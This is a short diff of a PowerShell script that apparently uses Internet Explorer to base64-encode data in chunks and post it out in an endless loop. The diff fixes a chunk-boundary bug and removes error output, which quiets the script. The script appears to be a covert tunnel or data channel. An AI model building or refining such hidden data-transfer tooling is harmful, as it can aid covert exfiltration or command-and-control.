@@ -54,7 +54,7 @@ function run {
     $col = 3;
     $i = 0;
     while ($i -le ($r.length - $CHUNK_SIZE)) {
-      $x = [Convert]::ToBase64String($r[$i..($i + $CHUNK_SIZE)]);
+      $x = [Convert]::ToBase64String($r[$i..($i + $CHUNK_SIZE - 1)]);
       post $ie 'Rx' ($s + '|' + $col) $x;
       $i += $CHUNK_SIZE;
       $col++;
@@ -83,6 +83,5 @@ while (1) {
     }
   } catch {
     taskkill.exe /f /im iexplore.exe;
-    write-host $_;
   }
 }
